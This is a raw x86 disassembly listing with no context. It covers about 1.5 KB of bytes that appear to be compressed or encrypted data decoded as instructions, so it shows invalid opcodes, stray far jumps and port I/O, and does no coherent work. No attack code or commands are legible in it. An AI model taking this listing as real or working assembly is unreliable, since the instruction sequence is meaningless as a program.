  4311b5:	6d                   	insl   (%dx),%es:(%edi)
  4311b6:	7c 1e                	jl     0x4311d6
  4311b8:	82 76 63 80          	xorb   $0x80,0x63(%esi)
  4311bc:	0a f5                	or     %ch,%dh
  4311be:	24 17                	and    $0x17,%al
  4311c0:	43                   	inc    %ebx
  4311c1:	17                   	pop    %ss
  4311c2:	11 eb                	adc    %ebp,%ebx
  4311c4:	d5 74                	aad    $0x74
  4311c6:	5b                   	pop    %ebx
  4311c7:	26 d1 ac c0 85 64 ea 	shrl   $1,%es:-0x4f159b7b(%eax,%eax,8)
  4311ce:	b0 
  4311cf:	a3 0f 5d b2 bc       	mov    %eax,0xbcb25d0f
  4311d4:	15 29 f1 ce c1       	adc    $0xc1cef129,%eax
  4311d9:	55                   	push   %ebp
  4311da:	f6 c5 32             	test   $0x32,%ch
  4311dd:	83 90 dc d4 20 5b 4d 	adcl   $0x4d,0x5b20d4dc(%eax)
  4311e4:	99                   	cltd
  4311e5:	a1 71 40 02 74       	mov    0x74024071,%eax
  4311ea:	c8 28 8e 92          	enter  $0x8e28,$0x92
  4311ee:	af                   	scas   %es:(%edi),%eax
  4311ef:	0d 46 a9 de eb       	or     $0xebdea946,%eax
  4311f4:	e5 53                	in     $0x53,%eax
  4311f6:	78 70                	js     0x431268
  4311f8:	a8 38                	test   $0x38,%al
  4311fa:	9e                   	sahf
  4311fb:	0e                   	push   %cs
  4311fc:	44                   	inc    %esp
  4311fd:	e2 f0                	loop   0x4311ef
  4311ff:	06                   	push   %es
  431200:	f0 e1 c6             	lock loope 0x4311c9
  431203:	3f                   	aas
  431204:	f7 95 48 f3 00 5f    	notl   0x5f00f348(%ebp)
  43120a:	92                   	xchg   %eax,%edx
  43120b:	a9 a1 5b f3 36       	test   $0x36f35ba1,%eax
  431210:	a8 41                	test   $0x41,%al
  431212:	8a bc 83 d7 e5 e7 dc 	mov    -0x23181a29(%ebx,%eax,4),%bh
  431219:	27                   	daa
  43121a:	b2 cc                	mov    $0xcc,%dl
  43121c:	3f                   	aas
  43121d:	64 33 70 f6          	xor    %fs:-0xa(%eax),%esi
  431221:	3d d0 11 6b 99       	cmp    $0x996b11d0,%eax
  431226:	8b d9                	mov    %ecx,%ebx
  431228:	c0 6b 37 db          	shrb   $0xdb,0x37(%ebx)
  43122c:	ea 6f c0 79 e2 60 b9 	ljmp   $0xb960,$0xe279c06f
  431233:	2b 06                	sub    (%esi),%eax
  431235:	3d 18 ad 61 74       	cmp    $0x7461ad18,%eax
  43123a:	3e 12 fb             	ds adc %bl,%bh
  43123d:	b7 64                	mov    $0x64,%bh
  43123f:	27                   	daa
  431240:	49                   	dec    %ecx
  431241:	68 ce 03 8f 7d       	push   $0x7d8f03ce
  431246:	0b 14 ca             	or     (%edx,%ecx,8),%edx
  431249:	38 8a 6d 7d b8 ad    	cmp    %cl,-0x52478293(%edx)
  43124f:	fe 05 d9 16 7a 80    	incb   0x807a16d9
  431255:	64 78 f9             	fs js  0x431251
  431258:	cb                   	lret
  431259:	f3 94                	repz xchg %eax,%esp
  43125b:	aa                   	stos   %al,%es:(%edi)
  43125c:	40                   	inc    %eax
  43125d:	ea 0a 2e ed d3 0b 37 	ljmp   $0x370b,$0xd3ed2e0a
  431264:	1d 45 ba 39 c0       	sbb    $0xc039ba45,%eax
  431269:	ea 36 86 73 56 a7 64 	ljmp   $0x64a7,$0x56738636
  431270:	ba a9 84 9d e8       	mov    $0xe89d84a9,%edx
  431275:	87 95 14 69 91 17    	xchg   %edx,0x17916914(%ebp)
  43127b:	8a 57 9f             	mov    -0x61(%edi),%dl
  43127e:	55                   	push   %ebp
  43127f:	30 90 2a 08 1d b7    	xor    %dl,-0x48e2f7d6(%eax)
  431285:	fc                   	cld
  431286:	52                   	push   %edx
  431287:	7b db                	jnp    0x431264
  431289:	10 62 e0             	adc    %ah,-0x20(%edx)
  43128c:	81 8d 06 4d d1 af fe 	orl    $0xd6fd2dfe,-0x502eb2fa(%ebp)
  431293:	2d fd d6 
  431296:	6b af 61 59 80 25 6d 	imul   $0x6d,0x25805961(%edi),%ebp
  43129d:	11 c1                	adc    %eax,%ecx
  43129f:	d0 c9                	ror    $1,%cl
  4312a1:	69 a0 9e 09 07 65 6e 	imul   $0x409f7f6e,0x6507099e(%eax),%esp
  4312a8:	7f 9f 40 
  4312ab:	ac                   	lods   %ds:(%esi),%al
  4312ac:	b4 e6                	mov    $0xe6,%ah
  4312ae:	56                   	push   %esi
  4312af:	df b7 56 3a 19 55    	fbstp  0x55193a56(%edi)
  4312b5:	93                   	xchg   %eax,%ebx
  4312b6:	01 c9                	add    %ecx,%ecx
  4312b8:	74 05                	je     0x4312bf
  4312ba:	5b                   	pop    %ebx
  4312bb:	2b d9                	sub    %ecx,%ebx
  4312bd:	df 2d f5 aa 76 2a    	fildll 0x2a76aaf5
  4312c3:	9e                   	sahf
  4312c4:	d6                   	salc
  4312c5:	64 e7 a1             	fs out %eax,$0xa1
  4312c8:	0a 46 94             	or     -0x6c(%esi),%al
  4312cb:	63 d0                	arpl   %edx,%eax
  4312cd:	34 d4                	xor    $0xd4,%al
  4312cf:	ba 80 75 43 e6       	mov    $0xe6437580,%edx
  4312d4:	b3 9e                	mov    $0x9e,%bl
  4312d6:	13 8c 81 0e ab 4c d4 	adc    -0x2bb354f2(%ecx,%eax,4),%ecx
  4312dd:	71 5d                	jno    0x43133c
  4312df:	ad                   	lods   %ds:(%esi),%eax
  4312e0:	f5                   	cmc
  4312e1:	e3 02                	jecxz  0x4312e5
  4312e3:	a1 73 ce d8 35       	mov    0x35d8ce73,%eax
  4312e8:	27                   	daa
  4312e9:	7f c3                	jg     0x4312ae
  4312eb:	8c 14 42             	mov    %ss,(%edx,%eax,2)
  4312ee:	4d                   	dec    %ebp
  4312ef:	66 18 0e             	data16 sbb %cl,(%esi)
  4312f2:	11 76 f1             	adc    %esi,-0xf(%esi)
  4312f5:	0a be f2 59 a0 b0    	or     -0x4f5fa60e(%esi),%bh
  4312fb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4312fc:	ad                   	lods   %ds:(%esi),%eax
  4312fd:	51                   	push   %ecx
  4312fe:	e0 28                	loopne 0x431328
  431300:	ff 2e                	ljmp   *(%esi)
  431302:	7a cf                	jp     0x4312d3
  431304:	ad                   	lods   %ds:(%esi),%eax
  431305:	ad                   	lods   %ds:(%esi),%eax
  431306:	67 7c f4             	addr16 jl 0x4312fd
  431309:	9a a8 87 d5 70 13 be 	lcall  $0xbe13,$0x70d587a8
  431310:	43                   	inc    %ebx
  431311:	c4 6e 93             	les    -0x6d(%esi),%ebp
  431314:	e8 be e4 5d 09       	call   0x9a0f7d7
  431319:	cd 37                	int    $0x37
  43131b:	18 a8 4b d2 25 72    	sbb    %ch,0x7225d24b(%eax)
  431321:	55                   	push   %ebp
  431322:	32 7c d5 16          	xor    0x16(%ebp,%edx,8),%bh
  431326:	2c 15                	sub    $0x15,%al
  431328:	ee                   	out    %al,(%dx)
  431329:	e4 16                	in     $0x16,%al
  43132b:	1a 04 8a             	sbb    (%edx,%ecx,4),%al
  43132e:	c6 87 55 30 1f b6 9c 	movb   $0x9c,-0x49e0cfab(%edi)
  431335:	70 03                	jo     0x43133a
  431337:	17                   	pop    %ss
  431338:	68 5d f3 d1 4d       	push   $0x4dd1f35d
  43133d:	d0 72 34             	shlb   $1,0x34(%edx)
  431340:	23 a3 1e 60 ae ed    	and    -0x12519fe2(%ebx),%esp
  431346:	e3 96                	jecxz  0x4312de
  431348:	9c                   	pushf
  431349:	11 02                	adc    %eax,(%edx)
  43134b:	78 c3                	js     0x431310
  43134d:	d3 50 d8             	rcll   %cl,-0x28(%eax)
  431350:	6e                   	outsb  %ds:(%esi),(%dx)
  431351:	f9                   	stc
  431352:	e1 98                	loope  0x4312ec
  431354:	0d e4 d5 65 e1       	or     $0xe165d5e4,%eax
  431359:	0d 6b 72 8d ac       	or     $0xac8d726b,%eax
  43135e:	61                   	popa
  43135f:	86 c9                	xchg   %cl,%cl
  431361:	4f                   	dec    %edi
  431362:	da 1f                	ficompl (%edi)
  431364:	ed                   	in     (%dx),%eax
  431365:	39 e6                	cmp    %esp,%esi
  431367:	13 21                	adc    (%ecx),%esp
  431369:	db f8                	(bad)
  43136b:	95                   	xchg   %eax,%ebp
  43136c:	0c b3                	or     $0xb3,%al
  43136e:	18 29                	sbb    %ch,(%ecx)
  431370:	4a                   	dec    %edx
  431371:	c9                   	leave
  431372:	6c                   	insb   (%dx),%es:(%edi)
  431373:	1b 79 9a             	sbb    -0x66(%ecx),%edi
  431376:	28 7f 64             	sub    %bh,0x64(%edi)
  431379:	e7 e8                	out    %eax,$0xe8
  43137b:	d4 76                	aam    $0x76
  43137d:	46                   	inc    %esi
  43137e:	84 0a                	test   %cl,(%edx)
  431380:	2f                   	das
  431381:	29 79 63             	sub    %edi,0x63(%ecx)
  431384:	b6 e0                	mov    $0xe0,%dh
  431386:	8d 5c d9 9e          	lea    -0x62(%ecx,%ebx,8),%ebx
  43138a:	89 ff                	mov    %edi,%edi
  43138c:	9e                   	sahf
  43138d:	0d cd e2 95 3f       	or     $0x3f95e2cd,%eax
  431392:	a9 44 45 99 0b       	test   $0xb994544,%eax
  431397:	74 e4                	je     0x43137d
  431399:	cc                   	int3
  43139a:	37                   	aaa
  43139b:	fc                   	cld
  43139c:	b0 39                	mov    $0x39,%al
  43139e:	97                   	xchg   %eax,%edi
  43139f:	02 5f 02             	add    0x2(%edi),%bl
  4313a2:	c2 a1 55             	ret    $0x55a1
  4313a5:	e0 be                	loopne 0x431365
  4313a7:	e0 cf                	loopne 0x431378
  4313a9:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4313aa:	43                   	inc    %ebx
  4313ab:	92                   	xchg   %eax,%edx
  4313ac:	ac                   	lods   %ds:(%esi),%al
  4313ad:	62 02                	bound  %eax,(%edx)
  4313af:	f1                   	int1
  4313b0:	98                   	cwtl
  4313b1:	0a 15 3f d4 c2 22    	or     0x22c2d43f,%dl
  4313b7:	41                   	inc    %ecx
  4313b8:	4a                   	dec    %edx
  4313b9:	95                   	xchg   %eax,%ebp
  4313ba:	2e 61                	cs popa
  4313bc:	84 e1                	test   %ah,%cl
  4313be:	11 69 04             	adc    %ebp,0x4(%ecx)
  4313c1:	c6 00 14             	movb   $0x14,(%eax)
  4313c4:	7b 6d                	jnp    0x431433
  4313c6:	f0 22 78 b4          	lock and -0x4c(%eax),%bh
  4313ca:	33 0b                	xor    (%ebx),%ecx
  4313cc:	a9 1b 33 dd 32       	test   $0x32dd331b,%eax
  4313d1:	2f                   	das
  4313d2:	ac                   	lods   %ds:(%esi),%al
  4313d3:	03 5a eb             	add    -0x15(%edx),%ebx
  4313d6:	16                   	push   %ss
  4313d7:	8f                   	(bad)
  4313d8:	24 91                	and    $0x91,%al
  4313da:	10 8f ed b1 9a e0    	adc    %cl,-0x1f654e13(%edi)
  4313e0:	97                   	xchg   %eax,%edi
  4313e1:	41                   	inc    %ecx
  4313e2:	f3 92                	repz xchg %eax,%edx
  4313e4:	72 da                	jb     0x4313c0
  4313e6:	a3 ff c1 10 36       	mov    %eax,0x3610c1ff
  4313eb:	85 59 c8             	test   %ebx,-0x38(%ecx)
  4313ee:	3e 4d                	ds dec %ebp
  4313f0:	e6 eb                	out    %al,$0xeb
  4313f2:	78 2d                	js     0x431421
  4313f4:	ca 32 62             	lret   $0x6232
  4313f7:	4e                   	dec    %esi
  4313f8:	ac                   	lods   %ds:(%esi),%al
  4313f9:	8b 3a                	mov    (%edx),%edi
  4313fb:	e0 bb                	loopne 0x4313b8
  4313fd:	3f                   	aas
  4313fe:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4313ff:	1f                   	pop    %ds
  431400:	95                   	xchg   %eax,%ebp
  431401:	29 5e de             	sub    %ebx,-0x22(%esi)
  431404:	b2 9a                	mov    $0x9a,%dl
  431406:	a1 34 d6 6b 81       	mov    0x816bd634,%eax
  43140b:	98                   	cwtl
  43140c:	7f e3                	jg     0x4313f1
  43140e:	7e 4e                	jle    0x43145e
  431410:	4c                   	dec    %esp
  431411:	85 b0 e2 f0 25 e6    	test   %esi,-0x19da0f1e(%eax)
  431417:	0f ec 1c 42          	paddsb (%edx,%eax,2),%mm3
  43141b:	06                   	push   %es
  43141c:	b5 77                	mov    $0x77,%ch
  43141e:	0c 3a                	or     $0x3a,%al
  431420:	9a 30 3a ee dd e3 bc 	lcall  $0xbce3,$0xddee3a30
  431427:	84 fc                	test   %bh,%ah
  431429:	9c                   	pushf
  43142a:	24 7e                	and    $0x7e,%al
  43142c:	55                   	push   %ebp
  43142d:	9d                   	popf
  43142e:	80 fc 39             	cmp    $0x39,%ah
  431431:	bf a2 c7 4a eb       	mov    $0xeb4ac7a2,%edi
  431436:	41                   	inc    %ecx
  431437:	91                   	xchg   %eax,%ecx
  431438:	f8                   	clc
  431439:	9c                   	pushf
  43143a:	74 0f                	je     0x43144b
  43143c:	ff b6 db 98 63 c3    	push   -0x3c9c6725(%esi)
  431442:	1d 53 c6 07 43       	sbb    $0x4307c653,%eax
  431447:	19 64 77 0e          	sbb    %esp,0xe(%edi,%esi,2)
  43144b:	15 a2 95 1c e2       	adc    $0xe21c95a2,%eax
  431450:	59                   	pop    %ecx
  431451:	dc c6                	fadd   %st,%st(6)
  431453:	72 02                	jb     0x431457
  431455:	ca f9 e5             	lret   $0xe5f9
  431458:	12 cd                	adc    %ch,%cl
  43145a:	46                   	inc    %esi
  43145b:	aa                   	stos   %al,%es:(%edi)
  43145c:	c5 9e b5 16 b6 62    	lds    0x62b616b5(%esi),%ebx
  431462:	24 b5                	and    $0xb5,%al
  431464:	cf                   	iret
  431465:	60                   	pusha
  431466:	a1 a9 1a d5 41       	mov    0x41d51aa9,%eax
  43146b:	21 ed                	and    %ebp,%ebp
  43146d:	14 27                	adc    $0x27,%al
  43146f:	ab                   	stos   %eax,%es:(%edi)
  431470:	43                   	inc    %ebx
  431471:	7f ee                	jg     0x431461
  431473:	65 39 8c 71 56 f0 8c 	cmp    %ecx,%gs:0x398cf056(%ecx,%esi,2)
  43147a:	39 
  43147b:	d6                   	salc
  43147c:	08 13                	or     %dl,(%ebx)
  43147e:	95                   	xchg   %eax,%ebp
  43147f:	e1 0d                	loope  0x43148e
  431481:	cb                   	lret
  431482:	15 f5 84 bf ed       	adc    $0xedbf84f5,%eax
  431487:	c2 9a 28             	ret    $0x289a
  43148a:	2e 25 d0 05 75 ac    	cs and $0xac7505d0,%eax
  431490:	aa                   	stos   %al,%es:(%edi)
  431491:	13 55 4d             	adc    0x4d(%ebp),%edx
  431494:	27                   	daa
  431495:	5b                   	pop    %ebx
  431496:	b3 ef                	mov    $0xef,%bl
  431498:	b4 14                	mov    $0x14,%ah
  43149a:	2d a2 ee 18 67       	sub    $0x6718eea2,%eax
  43149f:	0a eb                	or     %bl,%ch
  4314a1:	32 a1 1c 0e 48 ee    	xor    -0x11b7f1e4(%ecx),%ah
  4314a7:	66 02 4e 24          	data16 add 0x24(%esi),%cl
  4314ab:	39 4c 71 cd          	cmp    %ecx,-0x33(%ecx,%esi,2)
  4314af:	47                   	inc    %edi
  4314b0:	70 1c                	jo     0x4314ce
  4314b2:	48                   	dec    %eax
  4314b3:	87 17                	xchg   %edx,(%edi)
  4314b5:	87 1d 8d 0c 51 f6    	xchg   %ebx,0xf6510c8d
  4314bb:	88 94 9b ba 3a ce 8e 	mov    %dl,-0x7131c546(%ebx,%ebx,4)
  4314c2:	3b 22                	cmp    (%edx),%esp
  4314c4:	97                   	xchg   %eax,%edi
  4314c5:	99                   	cltd
  4314c6:	a2 c6 60 f0 3f       	mov    %al,0x3ff060c6
  4314cb:	87 3f                	xchg   %edi,(%edi)
  4314cd:	7f 93                	jg     0x431462
  4314cf:	85 07                	test   %eax,(%edi)
  4314d1:	7a ba                	jp     0x43148d
  4314d3:	28 e3                	sub    %ah,%bl
  4314d5:	57                   	push   %edi
  4314d6:	89 ee                	mov    %ebp,%esi
  4314d8:	17                   	pop    %ss
  4314d9:	2c f0                	sub    $0xf0,%al
  4314db:	2e a9 ba e3 ec e6    	cs test $0xe6ece3ba,%eax
  4314e1:	da f5                	(bad)
  4314e3:	81 9b 5a 82 32 a5 94 	sbbl   $0x9fd99b94,-0x5acd7da6(%ebx)
  4314ea:	9b d9 9f 
  4314ed:	fb                   	sti
  4314ee:	aa                   	stos   %al,%es:(%edi)
  4314ef:	f2 b7 e3             	repnz mov $0xe3,%bh
  4314f2:	dd 5e 04             	fstpl  0x4(%esi)
  4314f5:	dd d9                	fstp   %st(1)
  4314f7:	d7                   	xlat   %ds:(%ebx)
  4314f8:	72 08                	jb     0x431502
  4314fa:	54                   	push   %esp
  4314fb:	6a 11                	push   $0x11
  4314fd:	bc 5c 75 d0 dd       	mov    $0xddd0755c,%esp
  431502:	35 3a 35 75 16       	xor    $0x1675353a,%eax
  431507:	8b 93 91 99 50 ef    	mov    -0x10af666f(%ebx),%edx
  43150d:	7e 4e                	jle    0x43155d
  43150f:	68 3b 9d 1b 9c       	push   $0x9c1b9d3b
  431514:	7b 2b                	jnp    0x431541
  431516:	7c a2                	jl     0x4314ba
  431518:	f3 85 47 24          	repz test %eax,0x24(%edi)
  43151c:	81 44 fb e7 18 36 ad 	addl   $0x71ad3618,-0x19(%ebx,%edi,8)
  431523:	71 
  431524:	4f                   	dec    %edi
  431525:	ef                   	out    %eax,(%dx)
  431526:	6c                   	insb   (%dx),%es:(%edi)
  431527:	2a c9                	sub    %cl,%cl
  431529:	e1 28                	loope  0x431553
  43152b:	31 6d fa             	xor    %ebp,-0x6(%ebp)
  43152e:	08 d3                	or     %dl,%bl
  431530:	cf                   	iret
  431531:	6a 9c                	push   $0xffffff9c
  431533:	90                   	nop
  431534:	76 40                	jbe    0x431576
  431536:	44                   	inc    %esp
  431537:	7e 2f                	jle    0x431568
  431539:	96                   	xchg   %eax,%esi
  43153a:	f6 b9 73 1c ee fb    	idivb  -0x411e38d(%ecx)
  431540:	64 3d f9 8a e1 43    	fs cmp $0x43e18af9,%eax
  431546:	8f 83 16 62 94 b5    	pop    -0x4a6b9dea(%ebx)
  43154c:	3d 8c 4c 96 29       	cmp    $0x29964c8c,%eax
  431551:	51                   	push   %ecx
  431552:	d8 8b 17 b8 35 cc    	fmuls  -0x33ca47e9(%ebx)
  431558:	75 73                	jne    0x4315cd
  43155a:	84 11                	test   %dl,(%ecx)
  43155c:	8f                   	(bad)
  43155d:	f7 7c d5 a5          	idivl  -0x5b(%ebp,%edx,8)
  431561:	77 19                	ja     0x43157c
  431563:	b5 68                	mov    $0x68,%ch
  431565:	49                   	dec    %ecx
  431566:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  431567:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  431568:	52                   	push   %edx
  431569:	ea 82 cc 8a 62 3c 46 	ljmp   $0x463c,$0x628acc82
  431570:	4e                   	dec    %esi
  431571:	45                   	inc    %ebp
  431572:	55                   	push   %ebp
  431573:	5e                   	pop    %esi
  431574:	35 3a ce 8e 2f       	xor    $0x2f8ece3a,%eax
  431579:	6b e9 f2             	imul   $0xfffffff2,%ecx,%ebp
  43157c:	73 1c                	jae    0x43159a
  43157e:	f4                   	hlt
  43157f:	26 41                	es inc %ecx
  431581:	9e                   	sahf
  431582:	fd                   	std
  431583:	b3 14                	mov    $0x14,%bl
  431585:	d5 4f                	aad    $0x4f
  431587:	df 75 d9             	fbstp  -0x27(%ebp)
  43158a:	4e                   	dec    %esi
  43158b:	1f                   	pop    %ds
  43158c:	d9 80 d3 14 6b 79    	flds   0x796b14d3(%eax)
  431592:	23 a3 36 68 ea fd    	and    -0x21597ca(%ebx),%esp
  431598:	6b c3 a5             	imul   $0xffffffa5,%ebx,%eax
  43159b:	2b d8                	sub    %eax,%ebx
  43159d:	33 03                	xor    (%ebx),%eax
  43159f:	45                   	inc    %ebp
  4315a0:	04 31                	add    $0x31,%al
  4315a2:	67 03 91 bf 9d       	add    -0x6241(%bx,%di),%edx
  4315a7:	a9 49 0f a9 11       	test   $0x11a90f49,%eax
  4315ac:	34 7e                	xor    $0x7e,%al
  4315ae:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4315af:	18 d5                	sbb    %dl,%ch
  4315b1:	45                   	inc    %ebp
  4315b2:	5b                   	pop    %ebx
  4315b3:	cb                   	lret
  4315b4:	55                   	push   %ebp
  4315b5:	7d 6e                	jge    0x431625
  4315b7:	bf 1f 52 2c 9a       	mov    $0x9a2c521f,%edi
  4315bc:	55                   	push   %ebp
  4315bd:	19 e1                	sbb    %esp,%ecx
  4315bf:	a1 05 b1 7b 12       	mov    0x127bb105,%eax
  4315c4:	8d a4 fe 62 cc ad e2 	lea    -0x1d52339e(%esi,%edi,8),%esp
  4315cb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4315cc:	a3 88 b7 a1 fb       	mov    %eax,0xfba1b788
  4315d1:	11 05 1e e7 b2 39    	adc    %eax,0x39b2e71e
  4315d7:	4f                   	dec    %edi
  4315d8:	2a 62 b5             	sub    -0x4b(%edx),%ah
  4315db:	c0 be a1 c6 c5 c4 ef 	sarb   $0xef,-0x3b3a395f(%esi)
  4315e2:	16                   	push   %ss
  4315e3:	ba 5e 42 26 25       	mov    $0x2526425e,%edx
  4315e8:	8a 6f 7a             	mov    0x7a(%edi),%ch
  4315eb:	92                   	xchg   %eax,%edx
  4315ec:	4c                   	dec    %esp
  4315ed:	d1 69 93             	shrl   $1,-0x6d(%ecx)
  4315f0:	ce                   	into
  4315f1:	a9 c9 4e 5f d4       	test   $0xd45f4ec9,%eax
  4315f6:	da 3b                	fidivrl (%ebx)
  4315f8:	1d 41 2b bd 21       	sbb    $0x21bd2b41,%eax
  4315fd:	5c                   	pop    %esp
  4315fe:	41                   	inc    %ecx
  4315ff:	bd 21 ee 1f d0       	mov    $0xd01fee21,%ebp
  431604:	dc 68 43             	fsubrl 0x43(%eax)
  431607:	99                   	cltd
  431608:	a3 ac 10 fc 36       	mov    %eax,0x36fc10ac
  43160d:	d7                   	xlat   %ds:(%ebx)
  43160e:	48                   	dec    %eax
  43160f:	c8 90 47 12          	enter  $0x4790,$0x12
  431613:	9a f6 56 d8 95 71 1d 	lcall  $0x1d71,$0x95d856f6
  43161a:	0c 9e                	or     $0x9e,%al
  43161c:	1c 90                	sbb    $0x90,%al
  43161e:	7a df                	jp     0x4315ff
  431620:	6f                   	outsl  %ds:(%esi),(%dx)
  431621:	f5                   	cmc
  431622:	eb f9                	jmp    0x43161d
  431624:	50                   	push   %eax
  431625:	83 db be             	sbb    $0xffffffbe,%ebx
  431628:	e7 9b                	out    %eax,$0x9b
  43162a:	85 5e e9             	test   %ebx,-0x17(%esi)
  43162d:	83 70 bc 71          	xorl   $0x71,-0x44(%eax)
  431631:	93                   	xchg   %eax,%ebx
  431632:	d2 54 70 fb          	rclb   %cl,-0x5(%eax,%esi,2)
  431636:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  431637:	3e 62 a3 d8 ff bf 8a 	bound  %esp,%ds:-0x75400028(%ebx)
  43163e:	6b b8 2e cf f1 f4 82 	imul   $0xffffff82,-0xb0e30d2(%eax),%edi
  431645:	52                   	push   %edx
  431646:	df 94 87 e2 c0 d9 96 	fists  -0x69263f1e(%edi,%eax,4)
  43164d:	ca 38 7d             	lret   $0x7d38
  431650:	c8 8b 59 2b          	enter  $0x598b,$0x2b
  431654:	0e                   	push   %cs
  431655:	4a                   	dec    %edx
  431656:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431657:	60                   	pusha
  431658:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  431659:	cf                   	iret
  43165a:	db 96 c8 c3 61 35    	fistl  0x3561c3c8(%esi)
  431660:	ee                   	out    %al,(%dx)
  431661:	6b fd e5             	imul   $0xffffffe5,%ebp,%edi
  431664:	6d                   	insl   (%dx),%es:(%edi)
  431665:	fb                   	sti
  431666:	20 95 ed aa 11 05    	and    %dl,0x511aaed(%ebp)
  43166c:	11 78 be             	adc    %edi,-0x42(%eax)
  43166f:	1e                   	push   %ds
  431670:	b7 f8                	mov    $0xf8,%bh
  431672:	9c                   	pushf
  431673:	aa                   	stos   %al,%es:(%edi)
  431674:	68 62 27 b9 f0       	push   $0xf0b92762
  431679:	12 e3                	adc    %bl,%ah
  43167b:	25 bb d7 0a a9       	and    $0xa90ad7bb,%eax
  431680:	da 42 fd             	fiaddl -0x3(%edx)
  431683:	81 ee 2c 62 01 20    	sub    $0x2001622c,%esi
  431689:	8a 64 a1 66          	mov    0x66(%ecx,%eiz,4),%ah
  43168d:	3e a6                	cmpsb  %es:(%edi),%ds:(%esi)
  43168f:	58                   	pop    %eax
  431690:	2e 98                	cs cwtl
  431692:	0b 3b                	or     (%ebx),%edi
  431694:	03 20                	add    (%eax),%esp
  431696:	ed                   	in     (%dx),%eax
  431697:	e4 15                	in     $0x15,%al
  431699:	42                   	inc    %edx
  43169a:	2e c4 23             	les    %cs:(%ebx),%esp
  43169d:	2f                   	das
  43169e:	d8 01                	fadds  (%ecx)
  4316a0:	27                   	daa
  4316a1:	b5 d4                	mov    $0xd4,%ch
  4316a3:	e6 8b                	out    %al,$0x8b
  4316a5:	17                   	pop    %ss
  4316a6:	89 14 89             	mov    %edx,(%ecx,%ecx,4)
  4316a9:	d2 2d c7 73 7c d8    	shrb   %cl,0xd87c73c7
  4316af:	fb                   	sti
  4316b0:	fc                   	cld
  4316b1:	d5 65                	aad    $0x65
  4316b3:	36 a1 1c 97 fb 66    	mov    %ss:0x66fb971c,%eax
  4316b9:	d5 98                	aad    $0x98
  4316bb:	b6 d7                	mov    $0xd7,%dh
  4316bd:	a1 b6 8b 4e fd       	mov    0xfd4e8bb6,%eax
  4316c2:	8a 56 e8             	mov    -0x18(%esi),%dl
  4316c5:	3b 42 99             	cmp    -0x67(%edx),%eax
  4316c8:	b6 46                	mov    $0x46,%dh
  4316ca:	a9 a2 ae 13 76       	test   $0x7613aea2,%eax
  4316cf:	07                   	pop    %es
  4316d0:	57                   	push   %edi
  4316d1:	65 74 68             	gs je  0x43173c
  4316d4:	68 68 39 1c e0       	push   $0xe01c3968
  4316d9:	ff 6d 67             	ljmp   *0x67(%ebp)
  4316dc:	63 ec                	arpl   %ebp,%esp
  4316de:	08 75 0a             	or     %dh,0xa(%ebp)
  4316e1:	b9 62 8a 49 3c       	mov    $0x3c498a62,%ecx
  4316e6:	66 2c 27             	data16 sub $0x27,%al
  4316e9:	46                   	inc    %esi
  4316ea:	d4 09                	aam    $0x9
  4316ec:	de ce                	fmulp  %st,%st(6)
  4316ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4316ef:	c4 a2 cf 23 2d b9    	les    -0x46d2dc31(%edx),%esp
  4316f5:	42                   	inc    %edx
  4316f6:	54                   	push   %esp
  4316f7:	c1 c3 af             	rol    $0xaf,%ebx
  4316fa:	18 f9                	sbb    %bh,%cl
  4316fc:	6c                   	insb   (%dx),%es:(%edi)
  4316fd:	ae                   	scas   %es:(%edi),%al
  4316fe:	1e                   	push   %ds
  4316ff:	a8 5e                	test   $0x5e,%al
  431701:	7a 8a                	jp     0x43168d
  431703:	a9 0e a4 6f 26       	test   $0x266fa40e,%eax
  431708:	89 e0                	mov    %esp,%eax
  43170a:	06                   	push   %es
  43170b:	f2 ec                	repnz in (%dx),%al
  43170d:	93                   	xchg   %eax,%ebx
  43170e:	d1 bb 2e bf 74 cc    	sarl   $1,-0x338b40d2(%ebx)
  431714:	7d df                	jge    0x4316f5
  431716:	f8                   	clc
  431717:	a3 8a 97 f6 b6       	mov    %eax,0xb6f6978a
  43171c:	b8 55 bc c5 59       	mov    $0x59c5bc55,%eax
  431721:	f7 27                	mull   (%edi)
  431723:	c5 ef 0d             	(bad)
  431726:	65 6e                	outsb  %gs:(%esi),(%dx)
  431728:	28 5d 76             	sub    %bl,0x76(%ebp)
  43172b:	72 e6                	jb     0x431713
  43172d:	cb                   	lret
  43172e:	76 6e                	jbe    0x43179e
  431730:	61                   	popa
  431731:	36 e3 b6             	ss jecxz 0x4316ea
  431734:	00 3f                	add    %bh,(%edi)
  431736:	e8 a8 9c 55 7b       	call   0x7b98b3e3
  43173b:	02 c6                	add    %dh,%al
  43173d:	dc f8                	fdivr  %st,%st(0)
  43173f:	e3 98                	jecxz  0x4316d9
  431741:	da f6                	(bad)
  431743:	2b 54 1a 2c          	sub    0x2c(%edx,%ebx,1),%edx
  431747:	a0 4c 68 b5 27       	mov    0x27b5684c,%al
  43174c:	23 5a b8             	and    -0x48(%edx),%ebx
  43174f:	c7                   	(bad)
  431750:	8d 03                	lea    (%ebx),%eax
  431752:	76 10                	jbe    0x431764
  431754:	e2 c5                	loop   0x43171b
  431756:	e8 ac 43 79 41       	call   0x41bc5b07
  43175b:	f2 26 f0 03 d0       	repnz es lock add %eax,%edx
  431760:	35 79 3e 01 f8       	xor    $0xf8013e79,%eax
  431765:	c1 4f 02 f4          	rorl   $0xf4,0x2(%edi)
  431769:	6b fd a1             	imul   $0xffffffa1,%ebp,%edi
  43176c:	7d 18                	jge    0x431786
  43176e:	74 13                	je     0x431783
  431770:	37                   	aaa
  431771:	5c                   	pop    %esp
  431772:	d4 d2                	aam    $0xd2
  431774:	30 be 79 ee b7 8f    	xor    %bh,-0x70481187(%esi)
  43177a:	13 46 82             	adc    -0x7e(%esi),%eax
  43177d:	e1 96                	loope  0x431715
  43177f:	93                   	xchg   %eax,%ebx
  431780:	d8 9b 8d 0f ad 78    	fcomps 0x78ad0f8d(%ebx)
  431786:	74 3f                	je     0x4317c7
  431788:	2b 5d fb             	sub    -0x5(%ebp),%ebx
  43178b:	50                   	push   %eax
